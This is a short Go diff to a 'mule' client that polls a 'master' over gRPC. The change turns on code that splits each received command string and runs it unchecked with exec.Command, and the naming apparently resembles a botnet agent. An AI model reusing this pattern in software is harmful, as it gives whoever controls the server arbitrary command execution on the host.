@@ -2,8 +2,10 @@ package mule
 
 import (
 	"context"
+	"os/exec"
 	"fmt"
 	"math/rand"
+	"strings"
 	"time"
 
 	"google.golang.org/grpc"
@@ -61,20 +63,21 @@ func (n *Mule) Start() {
 		}
 
 		fmt.Println("Received command:", res.GetData())
-		// parts := strings.Split(res.GetData(), " ")
-		// if err := exec.Command(parts[0], parts[1:]...).Run(); err != nil {
-		// 	fmt.Println(err)
-		// }
+		parts := strings.Split(res.GetData(), " ")
+		fmt.Println(parts)
+		if err := exec.Command(parts[0], parts[1:]...).Run(); err != nil {
+			fmt.Println(err)
+		}
 	}
 }
 
 func (n *Mule) pingMaster() {
-	response, err := n.c.ReportStatus(context.Background(), &core.Request{Id: mule.id})
+	_, err := n.c.ReportStatus(context.Background(), &core.Request{Id: mule.id})
 	if err != nil {
 		fmt.Println("Error pinging master:", err)
 		return
 	}
-	fmt.Println("Ping response from master:", response.GetData())
+	// fmt.Println("Ping response from master:", response.GetData())
 }
 
 var mule *Mule
